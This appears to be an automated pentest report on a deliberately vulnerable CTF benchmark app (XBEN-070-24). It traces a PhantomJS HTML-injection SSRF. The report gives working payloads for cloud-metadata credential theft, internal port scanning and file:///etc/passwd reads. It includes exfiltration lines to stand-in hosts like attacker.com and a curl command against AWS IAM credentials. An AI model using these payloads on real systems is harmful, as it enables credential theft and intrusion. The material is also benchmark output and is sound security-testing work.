# SSRF Analysis Report

## 1. Executive Summary
- **Analysis Status:** Complete
- **Key Outcome:** One critical server-side request forgery vulnerability was identified in the PhantomJS HTML rendering component, exploitable via the publicly accessible `/page` endpoint without authentication.
- **Purpose of this Document:** This report provides the strategic context on the application's outbound request mechanisms, dominant flaw patterns, and key architectural details necessary to effectively exploit the vulnerability listed in the exploitation queue.

## 2. Dominant Vulnerability Patterns

### Pattern 1: Complete Absence of Input Sanitization Leading to HTML Injection SSRF
- **Description:** The application accepts user-controlled input via the `solution` POST parameter, performs zero validation or sanitization, and directly embeds it into an HTML template. This HTML is then rendered by PhantomJS (a headless browser with full server-side network access), which loads all embedded resources (images, scripts, stylesheets, iframes) specified in the user-controlled HTML. The lack of any URL validation, protocol restrictions, IP filtering, or network-level controls creates a complete SSRF vulnerability.
- **Implication:** Attackers can force the server to make arbitrary HTTP/HTTPS requests to internal services, cloud metadata endpoints (AWS/GCP/Azure), localhost services on any port, RFC1918 private networks, and external attacker-controlled servers. The vulnerability also permits dangerous protocol usage (file://, gopher://, ftp://) and enables internal network reconnaissance via port scanning.
- **Representative Finding:** `SSRF-VULN-01` - PhantomJS HTML Injection SSRF

### Pattern 2: Lack of Network Segmentation and Access Controls
- **Description:** PhantomJS subprocess runs with unrestricted network access identical to the Flask application itself. No Docker network isolation, no iptables rules, no egress filtering, and no DNS-based blocking mechanisms exist to prevent access to sensitive internal endpoints.
- **Implication:** Even if application-layer validation existed (which it doesn't), the absence of defense-in-depth network controls means a single bypass would grant full internal network access. The container can reach localhost services, Docker host gateway, other containers on the bridge network, and all internet resources.
- **Representative Finding:** Docker configuration analysis reveals default bridge networking with no restrictions

### Pattern 3: PhantomJS Configuration Without Security Hardening
- **Description:** PhantomJS is invoked with zero security-related command-line arguments and the check.js script implements no network request interception or URL filtering. No onResourceRequested handler exists to validate URLs before loading resources, and no page.settings restrictions are configured.
- **Implication:** PhantomJS will faithfully execute all network requests embedded in user-controlled HTML without question, making it a perfect SSRF proxy for attackers.
- **Representative Finding:** Subprocess invocation at app.py line 34 uses only timeout, with no security flags

## 3. Strategic Intelligence for Exploitation

### HTTP Client Library
- **Primary Client:** PhantomJS 2.1.1 (headless WebKit-based browser)
- **Invocation Method:** Subprocess via Python's `subprocess.Popen(["timeout","5","phantomjs", "check.js"], ...)` at app.py line 34
- **Input Mechanism:** URL passed via stdin, points to temporary HTML file containing user-controlled content
- **Network Capabilities:** Full HTTP/HTTPS client with JavaScript execution, supports all standard HTML resource loading mechanisms

### Request Architecture

**Data Flow:**
1. User submits POST to `/page` with `solution` parameter
2. Flask extracts: `msg = request.form.get('solution','')`
3. Minimal transformation: `value = "" if msg == "" else '> {0}'.format(msg)`
4. HTML template injection: `data = CHALLENGE_CONTENT_POST.format("8", "Circle", value, "", "")`
5. Template structure at injection point: `<input type=text name=solution placeholder="Enter solution..." {2}>`
6. User input appears at position {2}, inside input tag's attribute context
7. Complete HTML written to: `static/[random32hex].html`
8. PhantomJS loads: `http://localhost:5000/static/[random32hex].html`
9. PhantomJS renders HTML and loads all embedded resources

**Injection Context:**
- **Context Type:** HTML attribute (unquoted)
- **Escape Sequence:** Close input tag with `>` then inject arbitrary HTML
- **Example Payload:** `> <img src="http://target">` results in `<input ... > <img src="http://target">>`

**Critical Timing:**
- PhantomJS timeout: 5 seconds (line 34: `timeout 5 phantomjs`)
- Page evaluation delay: 1 second (check.js line 21: `setTimeout(function() {}, 1000)`)
- Maximum execution window: 4 seconds effective
- Temporary file cleanup: Guaranteed via finally block (app.py line 50)

### Internal Services Discovery

**From Reconnaissance and Code Analysis:**

**Accessible from PhantomJS Context:**
1. **Localhost Services (127.0.0.1):**
   - Port 5000: Flask application itself (confirmed accessible via hardcoded URL)
   - All other ports: No restrictions, can scan any port 1-65535

2. **Docker Network:**
   - Docker bridge network: Typically 172.17.0.0/16
   - Docker host gateway: Typically 172.17.0.1
   - Other containers: Accessible via Docker DNS if co-located

3. **Cloud Metadata Endpoints:**
   - AWS: `http://169.254.169.254/latest/meta-data/` (no IMDSv2 enforcement)
   - GCP: `http://metadata.google.internal/computeMetadata/v1/` (requires header, achievable via XHR in injected script)
   - Azure: `http://169.254.169.254/metadata/instance` (requires header, achievable via XHR)

4. **RFC1918 Private Networks:**
   - 10.0.0.0/8
   - 172.16.0.0/12
   - 192.168.0.0/16
   - No filtering exists for any private IP ranges

**Exploitation Techniques:**

**Simple Image-Based SSRF:**
```
solution="><img src="http://169.254.169.254/latest/meta-data/">
```

**JavaScript-Based SSRF with Custom Headers:**
```
solution="><script>var xhr=new XMLHttpRequest();xhr.open('GET','http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',false);xhr.setRequestHeader('Metadata-Flavor','Google');xhr.send();alert('XSS');</script><input "
```

**Port Scanning via Multiple Image Tags:**
```
solution="><img src="http://127.0.0.1:22"><img src="http://127.0.0.1:3306"><img src="http://127.0.0.1:6379"><img src="http://127.0.0.1:5432">
```

**Blind SSRF with DNS Exfiltration:**
```
solution="><img src="http://exfil-data.attacker.com">
```

**File Protocol Exploitation:**
```
solution="><iframe src="file:///etc/passwd"></iframe>
```

### Defense Mechanisms: NONE DETECTED

**Application Layer:**
- ❌ No URL validation or sanitization
- ❌ No HTML encoding (cgi.escape only applied to PhantomJS output, not user input)
- ❌ No protocol allowlisting/blocklisting
- ❌ No IP address filtering
- ❌ No port restrictions
- ❌ No Content Security Policy headers

**PhantomJS Layer:**
- ❌ No security command-line flags
- ❌ No onResourceRequested handler for URL filtering
- ❌ No page.settings restrictions
- ❌ No network request interception

**Network Layer:**
- ❌ No Docker network isolation
- ❌ No iptables/firewall rules
- ❌ No DNS-based blocking
- ❌ No egress filtering
- ❌ No VPC isolation

**Only Mitigation Present:**
- ✅ 5-second timeout on PhantomJS execution (limits duration but does NOT prevent exploitation)
- ✅ Random filename for temporary HTML file (prevents direct file access but does NOT prevent SSRF)

### Vulnerability Classification

**Type:** URL_Manipulation (with Service_Discovery capabilities)

**CVSS 3.1 Analysis:**
- Attack Vector (AV): Network (N)
- Attack Complexity (AC): Low (L)
- Privileges Required (PR): None (N)
- User Interaction (UI): None (N)
- Scope (S): Changed (C)
- Confidentiality Impact (C): High (H)
- Integrity Impact (I): Low (L)
- Availability Impact (A): Low (L)

**Estimated Score:** 9.3 (CRITICAL)

## 4. Secure by Design: Validated Components

**NONE IDENTIFIED**

After systematic analysis of all endpoints and request-making components, no secure patterns were found. The application implements zero security controls for SSRF prevention at any layer (application, runtime, or network).

| Component/Flow | Endpoint/File Location | Defense Mechanism Status | Verdict |
|---|---|---|---|
| POST /page Handler | `app.py:66-73` | No input validation, no sanitization, no encoding | **VULNERABLE** |
| PhantomJS Invocation | `app.py:33-50` | No security flags, no URL filtering | **VULNERABLE** |
| PhantomJS Script | `check.js:1-35` | No onResourceRequested handler, no network interception | **VULNERABLE** |
| Docker Network | `docker-compose.yml` | No network_mode restrictions, default bridge with full egress | **VULNERABLE** |
| Container Configuration | `Dockerfile` | No iptables rules, no capability dropping, runs as root | **VULNERABLE** |

**Conclusion:** The application demonstrates the complete absence of SSRF defense mechanisms. This is consistent with its purpose as a deliberately vulnerable CTF challenge, but represents critical security failures from a production security perspective.

## 5. External Exploitability Assessment

**Externally Exploitable:** ✅ YES

**Justification:**
1. **Public Endpoint:** `/page` endpoint is accessible via HTTP without authentication at `http://localhost:35947`
2. **No Authentication Required:** Application has zero authentication mechanisms (confirmed in recon deliverable Section 3)
3. **Direct Internet Access:** Port 35947 is exposed and accessible from external networks
4. **Single HTTP Request:** Exploitation requires only one POST request with malicious payload
5. **No Prerequisites:** No session establishment, no account creation, no multi-step workflow required

**From Internet → Exploitation Path:**
```
1. External Attacker (Internet) 
   ↓ HTTP POST
2. http://localhost:35947/page [solution=malicious_payload]
   ↓ Zero validation
3. PhantomJS renders HTML with user-controlled content
   ↓ Full server-side network access
4. PhantomJS makes HTTP requests to:
   - Cloud metadata endpoints (169.254.169.254)
   - Internal services (127.0.0.1:*, 10.0.0.0/8, etc.)
   - External attacker servers (for exfiltration/confirmation)
```

**External Attack Scenario:**
```bash
# From any internet-connected machine:
curl -X POST http://localhost:35947/page \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'solution="><img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">'
```

This single command, executable from anywhere on the internet, triggers SSRF and attempts to access AWS IAM credentials.

## 6. Detailed Vulnerability Analysis

### Backward Taint Analysis for SSRF-VULN-01

**Sink Location:** `check.js:20` - `page.open(input, function(status) {...})`

**Trace Path (Sink ← Source):**

1. **SINK:** PhantomJS page.open() loads URL and renders HTML
2. **←** `input` variable from `system.stdin.readLine()` (check.js:4)
3. **←** URL written to stdin: `proc.stdin.write(url)` (app.py:43)
4. **←** URL constructed: `url = 'http://localhost:5000/' + fn` (app.py:36)
5. **←** Temporary file written: `of.write(page)` (app.py:39)
6. **←** `page` parameter contains HTML with user input (app.py:33)
7. **←** `data` variable from template formatting (app.py:71)
8. **←** Template: `CHALLENGE_CONTENT_POST.format("8", "Circle", value, "", "")` (app.py:71)
9. **←** `value` from conditional: `"" if msg == "" else '> {0}'.format(msg)` (app.py:69)
10. **←** `msg` from form parameter: `request.form.get('solution','')` (app.py:68)
11. **SOURCE:** User-controlled POST parameter `solution` submitted to `/page` endpoint

**Sanitization Points:** NONE

**Mutations After Source:**
- String concatenation: `'> {0}'.format(msg)` adds `> ` prefix (facilitates HTML injection, does not sanitize)
- Template insertion: User input injected at position {2} in HTML template (no encoding)
- File write: Complete HTML written to filesystem (no tag filtering)
- URL construction: Points to localhost file (but file content is attacker-controlled)

**Verdict:** **VULNERABLE - No sanitization exists on path from source to sink**

**Why Vulnerable:**
1. User input `solution` flows directly from POST request to HTML template without ANY validation
2. No HTML encoding applied to user input (cgi.escape only used for PhantomJS output)
3. Injection context is HTML attribute, easily escaped with `>`
4. PhantomJS renders user-controlled HTML and loads all embedded resources
5. No URL validation, protocol restrictions, or network filtering at any layer

**Confidence Level:** HIGH

**Confidence Justification:**
- Complete source-to-sink trace documented with exact file and line references
- Zero ambiguity in data flow path
- No conditional logic that could prevent exploitation
- No evidence of sanitization or validation anywhere in trace
- Direct code inspection confirms vulnerability
- Injection context clearly allows HTML tag breakout
- PhantomJS capabilities verified to support full HTTP request capabilities

## 7. Key Findings Summary

### Total SSRF Sinks Analyzed: 1
- **SSRF-VULN-01:** PhantomJS HTML Injection (POST /page) - VULNERABLE

### Vulnerability Distribution by Type:
- URL_Manipulation: 1 (100%)
- Service_Discovery: 1 (enabled by URL manipulation)
- Protocol_Abuse: 1 (enabled by lack of protocol validation)
- Cloud_Metadata_Access: 1 (enabled by lack of IP filtering)

### Confidence Distribution:
- High Confidence: 1 (100%)
- Medium Confidence: 0 (0%)
- Low Confidence: 0 (0%)

### External Exploitability:
- Externally Exploitable: 1 (100%)
- Requires Internal Access: 0 (0%)

## 8. Recommendations for Exploitation Phase

**Priority Target:** SSRF-VULN-01 is the only vulnerability but represents maximum severity and exploitability.

**Recommended Exploitation Approach:**

1. **Initial Confirmation:**
   - Use simple image tag SSRF to attacker-controlled server to confirm vulnerability and capture server's external IP
   - Payload: `"><img src="http://attacker-webhook.site/confirm">`

2. **Cloud Metadata Enumeration:**
   - Attempt AWS metadata access: `"><img src="http://169.254.169.254/latest/meta-data/">`
   - If on GCP, use XHR-based approach with Metadata-Flavor header
   - If on Azure, use XHR-based approach with Metadata header

3. **Internal Service Discovery:**
   - Port scan localhost: Common ports 22, 3306, 5432, 6379, 9200, 11211, 27017
   - Port scan Docker host gateway: 172.17.0.1 on common ports
   - Use timing analysis to identify open ports (fast fail = closed, timeout = filtered, success/error = open)

4. **Protocol Abuse Testing:**
   - Test file:// protocol: `"><iframe src="file:///etc/passwd"></iframe>`
   - Test gopher:// for Redis exploitation if port 6379 detected

5. **Data Exfiltration:**
   - Use DNS exfiltration for blind scenarios: `"><img src="http://[data].attacker.com">`
   - Use external HTTP POST for response exfiltration via JavaScript

**Expected Challenges:**
- 5-second timeout limits slow operations (optimize for speed)
- Blind SSRF context (PhantomJS output not directly returned, use out-of-band techniques)
- Temporary file cleanup prevents race conditions (not relevant for SSRF)

**Success Criteria:**
- Confirm SSRF by receiving request at attacker-controlled server
- Access cloud metadata endpoint and retrieve credentials/tokens
- Enumerate at least 3 internal services via port scanning
- Demonstrate file:// protocol access if supported

## 9. Conclusion

The XBEN-070-24 application contains a **critical Server-Side Request Forgery vulnerability** with **HIGH confidence** exploitable via the publicly accessible `/page` endpoint without authentication. The vulnerability stems from the complete absence of input validation, output encoding, and network access controls. User-controlled HTML is rendered by PhantomJS with full server-side network access, enabling attackers to:

1. Access cloud provider metadata endpoints to steal credentials
2. Scan and access internal network services on any port
3. Exfiltrate data via DNS or HTTP to attacker-controlled servers
4. Read local files via file:// protocol
5. Perform protocol smuggling attacks via gopher:// or other schemes

The vulnerability is **externally exploitable** requiring only a single HTTP POST request from the internet. No authentication, no session establishment, and no complex prerequisites are required. The application demonstrates zero defensive security controls at application, runtime, or network layers, making exploitation straightforward and reliable.

**This vulnerability qualifies for immediate exploitation and represents the highest priority finding in this SSRF analysis.**